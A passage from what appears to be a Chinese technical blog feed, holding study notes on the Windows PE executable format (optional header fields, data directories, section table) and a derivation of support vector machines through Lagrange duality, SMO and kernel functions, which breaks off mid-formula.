class="meta-keyword">define</span> IMAGE_FILE_DLL                       0x2000  <span class="comment">// File is a DLL.</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_UP_SYSTEM_ONLY            0x4000  <span class="comment">// File should only be run on a UP machine</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_FILE_BYTES_REVERSED_HI         0x8000  <span class="comment">// Bytes of machine word are reversed.</span></span></span><br></pre></td></tr></table></figure>
<p>可以看出，PE文件头定义了PE文件的一些基本信息和属性，这些属性会在PE加载器加载时用到，如果加载器发现PE文件头中定义的一些属性不满足当前的运行环境，将会终止加载该PE。</p>
<p><strong>PE文件表头，标准 PE 头，20 字节。</strong></p>
<p><strong>PE文件表头可选部分，PE扩展PE头</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;      <span class="comment">//  标志字, ROM 映像（0107h）,普通可执行文件（010Bh）</span></span><br><span class="line">    BYTE    MajorLinkerVersion;    <span class="comment">// 链接程序的主版本号</span></span><br><span class="line">    BYTE    MinorLinkerVersion;    <span class="comment">// 链接程序的次版本号</span></span><br><span class="line">    DWORD   SizeOfCode;           <span class="comment">// 代码段的长度，如果有多个代码段，则是代码段长度的总和。</span></span><br><span class="line">    DWORD   SizeOfInitializedData;     <span class="comment">// 所有含已初始化数据的节的总大小</span></span><br><span class="line">    DWORD   SizeOfUninitializedData;   <span class="comment">// 所有含未初始化数据的节的大小</span></span><br><span class="line">    DWORD   AddressOfEntryPoint;       <span class="comment">// 程序执行入口 RVA</span></span><br><span class="line">    DWORD   BaseOfCode;                <span class="comment">// 代码的区块的起始RVA</span></span><br><span class="line">    DWORD   BaseOfData;                <span class="comment">// 数据的区块的起始RVA</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;                 <span class="comment">// 程序的首选装载地址，数据机制</span></span><br><span class="line">    DWORD   SectionAlignment;          <span class="comment">// 内存中的区块的对齐大小，块对齐</span></span><br><span class="line">    DWORD   FileAlignment;             <span class="comment">// 文件中的区块的对齐大小，文件块对齐</span></span><br><span class="line">    WORD    MajorOperatingSystemVersion;    <span class="comment">// 要求操作系统最低版本号的主版本号</span></span><br><span class="line">    WORD    MinorOperatingSystemVersion;    <span class="comment">// 要求操作系统最低版本号的副版本号</span></span><br><span class="line">    WORD    MajorImageVersion;      <span class="comment">// 可运行于操作系统的主版本号</span></span><br><span class="line">    WORD    MinorImageVersion;      <span class="comment">// 可运行于操作系统的次版本号</span></span><br><span class="line">    WORD    MajorSubsystemVersion;   <span class="comment">// 要求最低子系统版本的主版本号</span></span><br><span class="line">    WORD    MinorSubsystemVersion;    <span class="comment">// 要求最低子系统版本的次版本号</span></span><br><span class="line">    DWORD   Win32VersionValue;         <span class="comment">// 莫须有字段，不被病毒利用的话一般为0</span></span><br><span class="line">    DWORD   SizeOfImage;             <span class="comment">// 映像装入内存后的总尺寸</span></span><br><span class="line">    DWORD   SizeOfHeaders;            <span class="comment">// 所有头 + 区块表的尺寸大小</span></span><br><span class="line">    DWORD   CheckSum;                  <span class="comment">// 映像的校检和</span></span><br><span class="line">    WORD    Subsystem;                 <span class="comment">// 可执行文件期望的子系统</span></span><br><span class="line">    WORD    DllCharacteristics;        <span class="comment">// DllMain()函数何时被调用，默认为 0</span></span><br><span class="line">    DWORD   SizeOfStackReserve;        <span class="comment">// 初始化时的栈大小</span></span><br><span class="line">    DWORD   SizeOfStackCommit;         <span class="comment">// 初始化时实际提交的栈大小</span></span><br><span class="line">    DWORD   SizeOfHeapReserve;          <span class="comment">// 初始化时保留的堆大小</span></span><br><span class="line">    DWORD   SizeOfHeapCommit;          <span class="comment">// 初始化时实际提交的堆大小</span></span><br><span class="line">    DWORD   LoaderFlags;               <span class="comment">// 与调试有关，默认为 0</span></span><br><span class="line">    DWORD   NumberOfRvaAndSizes;    <span class="comment">//下边数据目录的项数，这个字段自Windows NT 发布以来一直是16</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;   <span class="comment">// 数据目录表</span></span><br></pre></td></tr></table></figure>
<p><code>WORD Magic;</code>, 表示可选头的类型。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_NT_OPTIONAL_HDR32_MAGIC      0x10b  <span class="comment">// 32位PE可选头</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_NT_OPTIONAL_HDR64_MAGIC      0x20b  <span class="comment">// 64位PE可选头</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_ROM_OPTIONAL_HDR_MAGIC       0x107</span></span><br></pre></td></tr></table></figure>
<p><code>IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</code> 这个字段可以说是最重要的字段之一，它由16个相同的IMAGE_DATA_DIRECTORY结构组成，虽然PE文件中的数据是按照装入内存后的页属性归类而被放在不同的节中的，但是这些处于各个节中的数据按照用途可以被分为导出表、导入表、资源、重定位表等数据块，这16个IMAGE_DATA_DIRECTORY结构就是用来定义多种不同用途的数据块的IMAGE_DATA_DIRECTORY结构的定义很简单，它仅仅指出了某种数据块的位置和长度。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_DATA_DIRECTORY &#123;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure>
<p>VirtualAddress：是一个RVA。 Size：是一个大小。 16个数据目录，数据目录列表的含义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT          0   <span class="comment">// Export Directory</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT          1   <span class="comment">// Import Directory</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE        2   <span class="comment">// Resource Directory</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   <span class="comment">// Exception Directory</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY        4   <span class="comment">// Security Directory</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC       5   <span class="comment">// Base Relocation Table</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG           6   <span class="comment">// Debug Directory</span></span></span><br><span class="line">    <span class="comment">//      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage)</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   <span class="comment">// Architecture Specific Data</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   <span class="comment">// RVA of GP</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS             9   <span class="comment">// TLS Directory</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   <span class="comment">// Load Configuration Directory</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   <span class="comment">// Bound Import Directory in headers</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            12   <span class="comment">// Import Address Table</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   <span class="comment">// Delay Load Import Descriptors</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   <span class="comment">// COM Runtime descriptor</span></span></span><br></pre></td></tr></table></figure>
<p>在PE文件中寻找特定的数据时就是从这些IMAGE_DATA_DIRECTORY结构开始的，比如要存取资源，那么必须从第3个IMAGE_DATA_DIRECTORY结构（索引为2）中得到资源数据块的大小和位置；同理，如果要查看PE文件导入了哪些DLL文件的哪些API函数，那就必须首先从第2个IMAGE_DATA_DIRECTORY结构得到导入表的位置和大小。</p>
<p>32位PE文件头 为 224 字节，可扩展， 一行 16 字节，14 行</p>
<h3 id="节表">节表</h3>
<figure>
<img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702231318692-747986508.jpg" alt="http://image.bubuko.com/info/201409/20180921125127615796.jpg" /><figcaption aria-hidden="true">http://image.bubuko.com/info/201409/20180921125127615796.jpg</figcaption>
</figure>
<p>PE文件中所有节的属性都被定义在节表中，节表由一系列的IMAGE_SECTION_HEADER结构排列而成，该类型的数组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_SECTION_HEADER &#123;</span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];     // 8个字节的节区名称</span><br><span class="line">    union &#123;</span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;      //节区的尺寸</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;      // 节区的 RVA 地址</span><br><span class="line">    DWORD   SizeOfRawData;        // 在文件中对齐后的尺寸</span><br><span class="line">    DWORD   PointerToRawData;      // 在文件中的偏移量</span><br><span class="line">    DWORD   PointerToRelocations;  // 在OBJ文件中使用，重定位的偏移</span><br><span class="line">    DWORD   PointerToLinenumbers;    // 行号表的偏移（供调试使用地）</span><br><span class="line">    WORD    NumberOfRelocations;    // 在OBJ文件中使用，重定位项数目</span><br><span class="line">    WORD    NumberOfLinenumbers;    // 行号表中行号的数目</span><br><span class="line">    DWORD   Characteristics;        // 节属性如可读，可写，可执行等</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>
<p>顺序排列的一系列节表数量和节的数量相应数据。</p>
<p>分别都为 40 字节。</p>
<h3 id="节数据">节数据</h3>
<figure>
<img src="https://img2022.cnblogs.com/blog/2348945/202207/2348945-20220702231318590-420917928.png" alt="img" /><figcaption aria-hidden="true">img</figcaption>
</figure>
<h2 id="参考">参考</h2>
<p><a href="https://zhuanlan.zhihu.com/p/31967907">PE可执行文件格式详解 - 知乎 (zhihu.com)</a></p>
<p>[PE文件结构入门到入坟 - FreeBuf网络安全行业门户</p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>PE</tag>
      </tags>
  </entry>
  <entry>
    <title>SVM</title>
    <url>/2021/10/17/SVM.html</url>
    <content><![CDATA[<h1 id="svm模型">SVM模型</h1>
<h2 id="简介">简介</h2>
<p><strong>支持向量机（support vector machines, SVM）</strong>是一种<strong>二分类模型</strong>，它的基本模型是定义在特征空间上的<strong>间隔最大的线性分类器</strong>，间隔最大使它有别于感知机；SVM还包括<strong>核技巧</strong>，这使它成为实质上的非线性分类器。</p>
<span id="more"></span>
<p>SVM的的学习策略就是间隔最大化，可形式化为一个求解<strong>凸二次规划</strong>的问题，也等价于正则化的合页损失函数的最小化问题。SVM的的学习算法就是求解凸二次规划的最优化算法。</p>
<meta name="referrer" content="no-referrer"/>
<h2 id="相关概念">相关概念</h2>
<p><strong>线性可分</strong>：二维空间上，两类点被一条直线完全分开叫做线性可分。</p>
<p><img src="https://www.zhihu.com/equation?tex=D_0" alt="[公式]" /> 和 <img src="https://www.zhihu.com/equation?tex=D_1" alt="[公式]" /> 是 n 维欧氏空间中的两个点集。如果存在 n 维向量 w 和实数 b，使得所有属于 <img src="https://www.zhihu.com/equation?tex=D_0" alt="[公式]" /> 的点 <img src="https://www.zhihu.com/equation?tex=x_i" alt="[公式]" /> 都有 <img src="https://www.zhihu.com/equation?tex=wx_i+%2B+b+%3E+0" alt="[公式]" /> ，而对于所有属于 <img src="https://www.zhihu.com/equation?tex=D_1" alt="[公式]" /> 的点 <img src="https://www.zhihu.com/equation?tex=x_j" alt="[公式]" /> 则有 <img src="https://www.zhihu.com/equation?tex=wx_j+%2B+b+%3C+0" alt="[公式]" /> ，则我们称 <img src="https://www.zhihu.com/equation?tex=D_0" alt="[公式]" /> 和 <img src="https://www.zhihu.com/equation?tex=D_1" alt="[公式]" /> 线性可分。</p>
<p><strong>最大间隔平面</strong>：从二维扩展到多维空间中时，将 <img src="https://www.zhihu.com/equation?tex=D_0" alt="[公式]" /> 和 <img src="https://www.zhihu.com/equation?tex=D_1" alt="[公式]" /> 完全正确地划分开的 <img src="https://www.zhihu.com/equation?tex=wx%2Bb%3D0" alt="[公式]" /> 就成了一个超平面。</p>
<p>为了使这个超平面更具<strong>鲁棒性</strong>，我们会去找最佳超平面，以最大间隔把两类样本分开的超平面，也称之为最大间隔超平面。</p>
<p><strong>支持向量</strong>：样本中距离超平面最近的一些点，这些点叫做支持向量。</p>
<p><img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210902194615509-1318363853.jpg" alt="img" style="zoom:67%;float: center;" ></p>
<h2 id="svm最优化问题"><strong>SVM最优化问题</strong></h2>
<p>超平面表示方法 <span class="math display">\[
w^{T} x+b=0
\]</span> 扩展到 <span class="math inline">\(n\)</span> 维空间后，点 <span class="math inline">\(x=\left(x_{1}, x_{2} \ldots x_{n}\right)\)</span> 到直线 <span class="math inline">\(w^{T} x+b=0\)</span> 的距离为: <span class="math display">\[
\frac{\left|w^{T} x+b\right|}{\|w\|}
\]</span> 其中 <span class="math inline">\(\|w\|=\sqrt{w_{1}^{2}+\ldots w_{n}^{2}}\)</span></p>
<p>支持向量到超平面的距离为 d，其他点到超平面的距离大于 d。</p>
<p>于是有下列公式： <span class="math display">\[
\begin{cases}\frac{w^{T} x+b}{\| w|| d} \geq 1 \quad y &amp; =1 \\ \frac{w^{T} x+b}{\|w\| d} \leq-1 &amp; y=-1\end{cases}
\]</span> <span class="math inline">\(\|w\| d\)</span> 是正数, 我们暂且令它为 1 （之所以令它等于 1, 是为了方便推导和优化，且这样做对目 标函数的优化没有影响），故:</p>
<p><strong>注</strong>：个人觉得是因为这个超平面对于一定的数据集是确定的，w是常数，d也是常熟，只是未知而已，但是是确定的，就像高中导数经常用的x0，去掉对优化无影响。 <span class="math display">\[
\left\{\begin{array}{l}
w^{T} x+b \geq 1 \quad y=1 \\
w^{T} x+b \leq-1 \quad y=-1
\end{array}\right.
\]</span> 将两个方程合并，我们可以简写为:</p>
<p><strong>注</strong>：还要加上y=1或-1的条件才行，参考中的这个有点问题 <span class="math display">\[
y\left(w^{T} x+b\right) \geq 1
\]</span> 至此我们就可以得到最大间隔超平面的上下两个超平面：</p>
<p><img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210902201557948-1924338082.jpg" alt="img" style="zoom:67%;float: center;" /></p>
<p>每个支持向量到超平面的距离可以写为: <span class="math display">\[
d=\frac{\left|w^{T} x+b\right|}{\|w\|}
\]</span> 由上述 <span class="math inline">\(y\left(w^{T} x+b\right)&gt;1&gt;0\)</span> 可以得到 <span class="math inline">\(y\left(w^{T} x+b\right)=\left|w^{T} x+b\right|\)</span>, 所以我们得到: <span class="math display">\[
d=\frac{y\left(w^{T} x+b\right)}{\|w\|}
\]</span> 这里乘上 2 倍也是为了后面推导，对目标函数没有影响。刚刚我们得到支持向量 <span class="math inline">\(y\left(w^{T} x+b\right)=1\)</span>, 所以我们得到: <span class="math display">\[
\max \frac{2}{\|w\|}
\]</span> 再做一个转换: <span class="math display">\[
\min \frac{1}{2}\|w\|
\]</span> 为了方便计算（去除 <span class="math inline">\(\|w\|\)</span> 的根号），我们有: <span class="math display">\[
\min \frac{1}{2}\|w\|^{2}
\]</span> 所以得到的<strong>最优化问题</strong>是：s.t.是subject to 局限于,加上y=+1或-1 <span class="math display">\[
\min \frac{1}{2}\|w\|^{2} 
s . t . \quad y_{i}\left(w^{T} x_{i}+b\right) \geq 1
\]</span> 这是一个含有不等式约束的凸二次规划问题，可以对其使用拉格朗日乘子法得到其对偶问题（dual problem）。</p>
<h2 id="对偶问题">对偶问题</h2>
<h3 id="拉格朗日乘数法">拉格朗日乘数法</h3>
<p>就是微积分多元函数求极值那个</p>
<h4 id="等式约束优化问题">等式约束优化问题</h4>
<p><span class="math display">\[
\min f\left(x_{1}, x_{2}, \ldots, x_{n}\right)
\]</span> s.t. <span class="math inline">\(\quad h_{k}\left(x_{1}, x_{2}, \ldots, x_{n}\right)=0 \quad k=1,2, \ldots, l\)</span></p>
<p>我们令 <span class="math inline">\(L(x, \lambda)=f(x)+\sum_{k=1}^{l} \lambda_{k} h_{k}(x)\)</span>, 函数 <span class="math inline">\(L(x, y)\)</span> 称为 Lagrange 函数，参数 <span class="math inline">\(\lambda\)</span> 称 为 Lagrange 乘子没有非负要求。 利用必要条件找到可能的极值点: <span class="math display">\[
\begin{cases}\frac{\partial L}{\partial x_{i}}=0 &amp; i=1,2, \ldots, n \\ \frac{\partial L}{\partial \lambda_{k}}=0 &amp; k=1,2, \ldots, l\end{cases}
\]</span> 等式约束下的 Lagrange 乘数法引入了 <img src="https://www.zhihu.com/equation?tex=l" alt="[公式]" /> 个 Lagrange 乘子，我们将 <img src="https://www.zhihu.com/equation?tex=x_%7Bi%7D" alt="[公式]" /> 与 <img src="https://www.zhihu.com/equation?tex=%5Clambda_%7Bk%7D" alt="[公式]" /> 一视同仁，把 <img src="https://www.zhihu.com/equation?tex=%5Clambda_%7Bk%7D+" alt="[公式]" /> 也看作优化变量，共有 <img src="https://www.zhihu.com/equation?tex=%28n%2Bl%29" alt="[公式]" /> 个优化变量。</p>
<h4 id="不等式约束优化问题">不等式约束优化问题</h4>
<p>主要思想是将不等式约束条件转变为等式约束条件，引入<strong>松弛变量</strong>，将松弛变量也是为优化变量。</p>
<p>可以写为: <span class="math display">\[
\begin{array}{ll}
\underset{x}{\operatorname{minimize}} &amp; f(\boldsymbol{x}) \\
\text { subject to } &amp; g_{i}(\boldsymbol{x}) \leq 0, i=1,2, \cdots, m
\end{array}
\]</span> 引入拉格朗日乘子 <span class="math inline">\(\left(\mu_{i} \geq 0\right)\)</span>, 定义上述问题的拉格朗日量 (Lagrangian) 如下 <span class="math display">\[
L(x, \mu)=\left[f(x)+\sum_{i=1}^{m} \mu_{i} g_{i}(x)\right]
\]</span> 同时定义拉格朗日对偶函数 (Lagrange dual function) 如下: <span class="math display">\[
F(\mu)=i n f_{x} L(x, \mu)=i n f_{x}\left[f(x)+\sum_{i=1}^{m} \mu_{i} g_{i}(x)\right]
\]</span> 一般情况下, <span class="math inline">\(L(x, \mu)\)</span> 是能取到最小值的, 所以 <span class="math inline">\(F(\mu)=\inf _{x} L(x, \mu)=\min _{x} L(x, \mu)\)</span> 求解。当强对偶性成立时, 通过KKT条件求解极值点, 然后从极值点挑出最值点。</p>
<p>求解。当强对偶性成立时，通过KKT条件求解极值点，然后从极值点挑出最值点。 <span class="math display">\[
\left\{\begin{array}{l}
\nabla f(x)+\sum_{i=1}^{m} \mu_{i} \nabla g_{i}(x)=0 \\
g_{i}(x) \leq 0, \forall i=1, \cdots, m \\
\mu_{i} \geq 0, \forall i=1, \cdots, m \\
\mu_{i} g_{i}(x)=0, \forall j=1, \cdots, m
\end{array}\right.
\]</span> 第一个条件使得目标函数和约束函数的法向量共线（梯度共线）。 最后一个条件称为互补松弛条件(Complementary Slackness Condition)。通过引入这个条件, 增加了m个等式约束，使得等式的数量跟变量一样。</p>
<h3 id="强对偶性">强对偶性</h3>
<p>对偶问题其实就是将: <span class="math display">\[
\begin{gathered}
\min _{w} \max _{\lambda} L(w, \lambda) \\
s . t . \quad \lambda_{i} \geq 0
\end{gathered}
\]</span> 变成了： <span class="math display">\[
\begin{gathered}
\max _{\lambda} \min _{w} L(w, \lambda) \\
s . t . \quad \lambda_{i} \geq 0
\end{gathered}
\]</span> 类似于上面的倒数得到SVM最优化问题的表达式。</p>
<p>假设有个函数 <span class="math inline">\(f\)</span> 我们有: <span class="math display">\[
\min \max f \geq \max \min f
\]</span> 也就是说，最大的里面挑出来的最小的也要比最小的里面挑出来的最大的要大。这关系实际上就是 弱对偶关系，而强对偶关系是当等号成立时，即: <span class="math display">\[
\min \max f=\max \min f
\]</span> 如果 <span class="math inline">\(f\)</span> 是凸优化问题，强对偶性成立。</p>
<h2 id="svm优化过程">SVM优化过程</h2>
<p><strong>SVM优化公式</strong>： <span class="math display">\[
\begin{aligned}
  &amp;\quad \min _{w} \frac{1}{2}\|w\|^{2} \\
       &amp;\text { s.t. } \quad g_{i}(w, b)=1-y_{i} \quad\left(w^{T} x_{i}+b\right) \leq 0, \quad i=1,2, \ldots, n
\end{aligned}
\]</span></p>
<h3 id="构造拉格朗日函数">构造拉格朗日函数</h3>
<p>微积分多元函数学的，忘得差不多了。。，就是用来求最大最小值的 <span class="math display">\[
\begin{aligned}
\min _{w, b} \max _{\lambda} L(w, b, \lambda)=&amp; \frac{1}{2}\|w\|^{2}+\sum_{i=1}^{n} \lambda_{i}\left[1-y_{i}\left(w^{T} x_{i}+b\right)\right] \\
&amp; s . t . \quad \lambda_{i} \geq 0
\end{aligned}
\]</span></p>
<h3 id="利用强对偶性转化">利用强对偶性转化：</h3>
<p>利用强对偶性转化: <span class="math display">\[
\max _{\lambda} \min _{w, b} L(w, b, \lambda)
\]</span> 现对参数 <span class="math inline">\(\mathrm{w}\)</span> 和 <span class="math inline">\(\mathrm{b}\)</span> 求偏导数: <span class="math display">\[
\begin{aligned}
&amp;\frac{\partial L}{\partial w}=w-\sum_{i=1}^{n} \lambda_{i} x_{i} y_{i}=0 \\
&amp;\frac{\partial L}{\partial b}=\sum_{i=1}^{n} \lambda_{i} y_{i}=0
\end{aligned}
\]</span> 得到: <span class="math display">\[
\begin{aligned}
\sum_{i=1}^{n} \lambda_{i} x_{i} y_{i} &amp;=w \\
\sum_{i=1}^{n} \lambda_{i} y_{i} &amp;=0
\end{aligned}
\]</span> 我们将这个结果带回到函数中可得: <span class="math display">\[
\begin{aligned}
L(w, b, \lambda) &amp;=\frac{1}{2} \sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)+\sum_{i=1}^{n} \lambda_{i}-\sum_{i=1}^{n} \lambda_{i} y_{i}\left(\sum_{j=1}^{n} \lambda_{j} y_{j}\left(x_{i} \cdot x_{j}\right)+b\right) \\
&amp;=\frac{1}{2} \sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)+\sum_{i=1}^{n} \lambda_{i}-\sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)-\sum_{i=1}^{n} \lambda_{i} y_{i} b \\
&amp;=\sum_{i=1}^{n} \lambda_{i}-\frac{1}{2} \sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)
\end{aligned}
\]</span> 也就是说: <span class="math display">\[
\min _{w, b} L(w, b, \lambda)=\sum_{i=1}^{n} \lambda_{i}-\frac{1}{2} \sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)
\]</span> 去掉了w和b变量，得到只含有一个变量的式子，如下：</p>
<p><span class="math display">\[
\begin{gathered}
\max _{\lambda}\left[\sum_{i=1}^{n} \lambda_{i}-\frac{1}{2} \sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)\right] \\
\text { s.t. } \sum_{i=1}^{n} \lambda_{i} y_{i}=0 \quad \lambda_{i} \geq 0
\end{gathered}
\]</span> 我们可以看出来这是一个二次规划问题，问题规模正比于训练样本数，我们常用 <strong>SMO(Sequential Minimal Optimization) 算法</strong>求解。</p>
<p><strong>SMO(Sequential Minimal Optimization)，序列最小优化算法</strong>，其核心思想非常简单：每次只优 化一个参数, 其他参数先固定住, 仅求当前这个优化参数的极值。我们来看一下 SMO 算法在 SVM 中的应用。 我们刚说了 SMO 算法每次只优化一个参数，但我们的优化目标有约束条件: <span class="math inline">\(\sum_{i=1}^{n} \lambda_{i} y_{i}=0\)</span>,</p>
<ol type="1">
<li>选择两个需要更新的参数 <span class="math inline">\(\lambda_{i}\)</span> 和 <span class="math inline">\(\lambda_{j}\)</span>, 固定其他参数。于是我们有以下约束: 这样约束就变成了： <span class="math display">\[
\lambda_{i} y_{i}+\lambda_{j} y_{j}=c \quad \lambda_{i} \geq 0, \lambda_{j} \geq 0
\]</span> 其中 <span class="math inline">\(c=-\sum_{k \neq i, j} \lambda_{k} y_{k}\)</span>, 由此可以得出 <span class="math inline">\(\lambda_{j}=\frac{c-\lambda_{i} y_{i}}{y_{j}}\)</span>, 也就是说我们可以用 <span class="math inline">\(\lambda_{i}\)</span> 的表达 式代替 <span class="math inline">\(\lambda_{j}\)</span> 。这样就相当于把目标问题转化成了仅有一个约束条件的最优化问题, 仅有的约束是 <span class="math inline">\(\lambda_{i} \geq 0\)</span></li>
<li>对于仅有一个约束条件的最优化问题，我们完全可以在 <span class="math inline">\(\lambda_{i}\)</span> 上对优化目标求偏导, 令导数为 零, 从而求出变量值 <span class="math inline">\(\lambda_{i_{\text {new }}}\)</span>, 然后根据 <span class="math inline">\(\lambda_{i_{\text {new }}}\)</span> 求出 <span class="math inline">\(\lambda_{j_{\text {new }}}\)</span> 。</li>
<li>多次迭代直至收敛。 通过 <span class="math inline">\(\mathrm{SMO}\)</span> 求得最优解 <span class="math inline">\(\lambda^{*}\)</span> 。</li>
</ol>
<p>求偏导数时得到： <span class="math display">\[
w=\sum_{i=1}^{m} \lambda_{i} y_{i} x_{i}
\]</span> 由上式可求得 <span class="math inline">\(\mathrm{w}\)</span> 。 我们知道所有 <span class="math inline">\(\lambda_{i}&gt;0\)</span> 对应的点都是支持向量, 我们可以随便找个支持向量, 然后带入： <span class="math inline">\(y_{s}\left(w x_{s}+b\right)=1\)</span>, 求出 <span class="math inline">\(b\)</span> 即可, 两边同乘 <span class="math inline">\(y_{s}\)</span>, 得 <span class="math inline">\(y_{s}^{2}\left(w x_{s}+b\right)=y_{s}\)</span> 因为 <span class="math inline">\(y_{s}^{2}=1\)</span>, 所以: <span class="math inline">\(b=y_{s}-w x_{s}\)</span> 为了更具鲁棒性，我们可以求得支持向量的均值: <span class="math display">\[
b=\frac{1}{|S|} \sum_{s \in S}\left(y_{s}-w x_{s}\right)
\]</span> 步骤 <span class="math inline">\(5: \mathrm{w}\)</span> 和 <span class="math inline">\(\mathrm{b}\)</span> 都求出来了，我们就能构造出最大分割超平面： <span class="math inline">\(\boldsymbol{w}^{T} x+b=0\)</span> 分类决策函数： <span class="math inline">\(f(x)=\operatorname{sign}\left(w^{T} x+b\right)\)</span> 其中 <span class="math inline">\(\operatorname{sign}(\cdot)\)</span> 为阶跃函数： <span class="math display">\[
\operatorname{sign}(x)=\left\{\begin{array}{rl}
-1 &amp; x&lt;0 \\
0 &amp; x=0 \\
1 &amp; x&gt;0
\end{array}\right.
\]</span> 将新样本点导入到决策函数中既可得到样本的分类。</p>
<h2 id="核函数">核函数</h2>
<h4 id="问题">问题</h4>
<p>线性不可分问题：将二维线性不可分样本映射到高维空间中，让样本点在高维空间线性可分</p>
<p><img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210902213653815-1203370718.jpg" alt="img" style="zoom:67%;" /></p>
<h4 id="核函数意义">核函数意义</h4>
<p>这是因为低维空间映射到高维空间后维度可能会很大，如果将全部样本的点乘全部计算好，这样的 <strong>计算量太大</strong>了。 但如果我们有这样的一核函数 <span class="math inline">\(k(x, y)=(\phi(x), \phi(y)), \quad x_{i}\)</span> 与 <span class="math inline">\(x_{j}\)</span> 在特征空间的内积等于 它们在原始样本空间中通过函数 <span class="math inline">\(k(x, y)\)</span> 计算的结果，我们就不需要计算高维甚至无穷维空间的 内积了。</p>
<p>举个例子：假设我们有一个多项式核函数: <span class="math display">\[
k(x, y)=(x \cdot y+1)^{2}
\]</span> 带进样本点的后： <span class="math display">\[
k(x, y)=\left(\sum_{i=1}^{n}\left(x_{i} \cdot y_{i}\right)+1\right)^{2}
\]</span> 而它的展开项是： <span class="math display">\[
